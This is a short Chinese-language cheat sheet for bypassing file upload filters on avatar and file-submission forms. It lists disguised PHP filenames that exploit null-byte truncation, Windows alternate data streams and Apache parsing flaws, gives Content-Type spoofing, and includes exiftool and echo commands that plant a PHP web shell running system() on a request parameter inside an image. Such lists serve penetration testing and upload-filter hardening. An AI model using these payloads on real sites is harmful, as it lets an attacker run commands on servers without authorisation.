# 文件上传绕过

适用于头像上传、文件提交等场景。

## 扩展名绕过

- shell.php.jpg
- shell.php%00.jpg (空字节截断)
- shell.php%20
- shell.php.
- shell.php::$DATA (Windows ADS)
- shell.pHp
- shell.php5, .phtml, .pht, .phar, .shtml
- shell.jpg.php
- shell.php/. (Apache 解析缺陷)

## Content-Type 绕过

- 将 Content-Type 改为 image/jpeg、image/gif、image/png

## 内容绕过 (图片马)

- 通过 exiftool 注入: exiftool -Comment='<?php system($_GET[\'cmd\']); ?>' image.jpg
- 使用 echo 追加: echo '<?php system($_GET[\'cmd\']); ?>' >> image.jpg